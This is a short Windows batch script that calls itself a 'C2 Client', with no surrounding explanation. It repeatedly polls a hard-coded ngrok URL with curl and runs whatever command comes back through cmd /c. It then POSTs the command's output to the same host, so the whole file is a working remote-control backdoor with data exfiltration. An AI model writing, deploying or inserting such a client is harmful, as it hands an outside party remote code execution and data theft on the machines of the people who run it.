@echo off
setlocal enabledelayedexpansion
set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
set LAST_CMD=

echo [*] Starting C2 Client
echo [*] URL: %URL%

:loop
    timeout /t 3 /nobreak >nul
    
    rem Use a simpler method to get command
    curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>&1
    
    rem Read first line only
    set /p CMD=<%TEMP%\c2_raw.txt
    
    echo [DEBUG] Got: !CMD!
    
    if "!CMD!"=="" goto loop
    if "!CMD!"=="WAITING" goto loop
    if "!CMD!"=="!LAST_CMD!" (
        echo [*] Duplicate, skipping
        goto loop
    )
    
    set LAST_CMD=!CMD!
    echo [*] Executing: !CMD!
    
    set TEMPFILE=%TEMP%\c2_output.txt
    cmd /c "!CMD!" > "!TEMPFILE!" 2>&1
    
    if exist "!TEMPFILE!" (
        curl -X POST --data-binary @"!TEMPFILE!" --max-time 10 %URL% 2>nul
        del "!TEMPFILE!" 2>nul
    )
    
    set CMD=
goto loop
